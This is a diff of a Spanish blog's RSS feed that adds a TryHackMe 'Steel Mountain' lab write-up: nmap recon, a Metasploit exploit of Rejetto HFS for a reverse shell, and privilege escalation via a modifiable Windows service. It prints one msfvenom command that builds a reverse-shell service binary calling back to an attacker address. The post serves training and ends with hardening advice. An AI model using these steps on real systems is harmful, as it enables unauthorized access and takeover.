@@ -9,8 +9,125 @@
     <managingEditor>gabrieltello10@hotmail.com (Gabriel Tello)</managingEditor>
     <webMaster>gabrieltello10@hotmail.com (Gabriel Tello)</webMaster>
     <copyright>[Gabriel Tello](https://github.com/gtello) © 2024</copyright>
-    <lastBuildDate>Thu, 31 Oct 2024 16:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 12 Nov 2024 11:40:00 +0000</lastBuildDate>
     <atom:link href="https://gtello.github.io/es/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Steel Mountain (THM)</title>
+      <link>https://gtello.github.io/es/writeups/steelmountain/</link>
+      <pubDate>Tue, 12 Nov 2024 11:40:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
+      <guid>https://gtello.github.io/es/writeups/steelmountain/</guid>
+      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://www.tryhackme.com/room/steelmountain&#34;&gt;Steel Mountain&lt;/a&gt; de TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Encontramos varias vulnerabilidades que nos permitieron obtener acceso no autorizado al sistema. Primero, encontramos servicios en los puertos 80 y 8080 que exponían información sensible. Luego, usando un exploit en uno de estos servicios, conseguimos acceso al sistema con una reverse shell.&lt;/p&gt;&#xA;&lt;p&gt;Después, escalamos privilegios y logramos permisos de administrador gracias a una mala configuración de permisos en uno de los servicios del sistema, lo cual nos dio acceso a archivos críticos y nos permitió llegar hasta información confidencial.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<div style="text-align: justify;">
+<p>Writeup de la máquina <a href="https://www.tryhackme.com/room/steelmountain">Steel Mountain</a> de TryHackMe.</p>
+<h2 id="resumen">Resumen</h2>
+<p>Encontramos varias vulnerabilidades que nos permitieron obtener acceso no autorizado al sistema. Primero, encontramos servicios en los puertos 80 y 8080 que exponían información sensible. Luego, usando un exploit en uno de estos servicios, conseguimos acceso al sistema con una reverse shell.</p>
+<p>Después, escalamos privilegios y logramos permisos de administrador gracias a una mala configuración de permisos en uno de los servicios del sistema, lo cual nos dio acceso a archivos críticos y nos permitió llegar hasta información confidencial.</p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Empezamos con un escaneo de red con nmap para ver qué puertos estaban abiertos y qué servicios corrían en ellos.</p>
+<div>
+  <img src="/images/posts/steelmountain/image1.png" alt="Resultado nmap" />
+</div>
+<center><em>Figura 1:</em> Resultado nmap</center>
+<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Sistema Operativo</th>
+          <th style="text-align: left">Dirección IP</th>
+          <th style="text-align: left">Puertos Abiertos</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">Windows Server 2008</td>
+          <td style="text-align: left">10.10.128.109</td>
+          <td style="text-align: left">80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="explotación">Explotación</h2>
+<p>Al investigar el puerto 80 en el navegador, encontramos la página de inicio de Steel Mountain con un &ldquo;Empleado del Mes&rdquo; llamado Bill Harper (nombre tomado del archivo de la imagen). En el puerto 8080, descubrimos un servidor Rejetto HTTP que estaba expuesto y vulnerable a un exploit de ejecución remota de comandos (Remote Command Execution) en la versión 2.3.x de HFS. Usamos metasploit para lanzar el exploit y obtener una conexión reverse shell en el servidor. En el escritorio del usuario se encuentra la primera bandera.</p>
+<div style="text-align: center;">
+  <img width="1000" src="/images/posts/steelmountain/image2.png" alt="steelmountain" />
+</div>
+<center><em>Figura 2:</em> Homepage de Steel Mountain</center>
+<br>
+<div style="text-align: center;">
+  <img src="/images/posts/steelmountain/image3.png" alt="hfs http file server" />
+</div>
+<center><em>Figura 3:</em> Servidor Rejetto HTTP expuesto</center>
+<br>
+<div style="text-align: center;">
+  <img src="/images/posts/steelmountain/image4.png" alt="shell metasploit" />
+</div>
+<center><em>Figura 4:</em> Shell obtenido en metasploit</center>
+<h2 id="escalación-de-privilegios">Escalación de privilegios</h2>
+<p>Con acceso inicial al sistema, ejecutamos el script <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> en PowerShell para buscar posibles problemas de configuración en el sistema Windows. El script detectó que el servicio <code>AdvancedSystemCareService9</code> tenía configuraciones de permisos mal configuradas:</p>
+<ul>
+<li>La ruta del servicio no tenía comillas y tenía espacios, lo que es vulnerable en Windows.</li>
+<li>El servicio estaba configurado con permisos modificables, lo que permite a usuarios sin privilegios hacer cambios.</li>
+</ul>
+<div style="text-align: center;">
+  <img width="1000" src="/images/posts/steelmountain/image5.png" alt="script powerup" />
+</div>
+<center><em>Figura 5:</em> Uso de script PowerUp</center>
+<p>Creamos un payload de reverse shell con msfvenom usando el comando:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -e x86/shikata_ga_nai -f exe-service -o CleanupService.exe</span></span></code></pre></div><p>Este comando generó un ejecutable <code>CleanupService.exe</code> con un payload de revervse shell hacia nuestra máquina. Subimos este archivo al servidor, reemplazamos el ejecutable legítimo del servicio y lo reiniciamos con <code>sc stop</code> y <code>sc start</code>, ejecutando así nuestro payload y obteniendo acceso de administrador.</p>
+<div style="text-align: center;">
+  <img width="1000" src="/images/posts/steelmountain/image6.png" alt="ejecutable reemplazado" />
+</div>
+<center><em>Figura 6:</em> Ejecutable reemplazado</center>
+<p>Una vez dentro del sistema se consiguió la bandera final.</p>
+<div style="text-align: center;">
+  <img src="/images/posts/steelmountain/image7_1.png" alt="acceso a system" /><br>
+  <img src="/images/posts/steelmountain/image7_2.png" alt="bandera" />
+</div>
+<center><em>Figura 7:</em> Acceso a cuenta Administrador</center>
+<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Herramienta</th>
+          <th style="text-align: left">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">nmap</td>
+          <td style="text-align: left">Para el reconocimiento inicial y detección de servicios y puertos abiertos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">metasploit</td>
+          <td style="text-align: left">Para lanzar el exploit contra el servidor Rejetto HTTP.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">PowerUp.ps1</td>
+          <td style="text-align: left">Script de PowerShell para analizar configuraciones de privilegios en sistemas Windows.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">msfvenom</td>
+          <td style="text-align: left">Para generar el payload de reverse shell que ejecutamos para obtener permisos de administrador.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="conclusión">Conclusión</h2>
+<p>Esta máquina era bastante vulnerable, con servicios web mal configurados y permisos inseguros en algunos servicios, lo que hizo relativamente fácil tanto el acceso inicial como la escalación de privilegios.</p>
+<h2 id="recomendaciones">Recomendaciones</h2>
+<p>Para mejorar la seguridad:</p>
+<ol>
+<li>Restringir el acceso a puertos no esenciales y limitar el acceso a IPs confiables.</li>
+<li>Actualizar o reemplazar el servidor Rejetto HTTP para cerrar posibles vulnerabilidades.</li>
+<li>Revisar y ajustar las configuraciones de servicios, asegurándose de que las rutas estén entre comillas y los permisos de modificación sean seguros.</li>
+<li>Implementar monitoreo y control de accesos en tiempo real para detectar cualquier actividad no autorizada en el sistema.</li>
+</ol>
+</div>
+]]></content:encoded>
+    </item>
     <item>
       <title>Máquina Bolt</title>
       <link>https://gtello.github.io/es/writeups/bolt/</link>
@@ -113,7 +230,7 @@ Esta es una guía paso a paso presentada en formato de reporte profesional sobre
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Nmap</td>
+          <td style="text-align: left">nmap</td>
           <td style="text-align: left">Utilizada para el escaneo de red y detección de puertos y servicios abiertos en la máquina objetivo.</td>
       </tr>
       <tr>
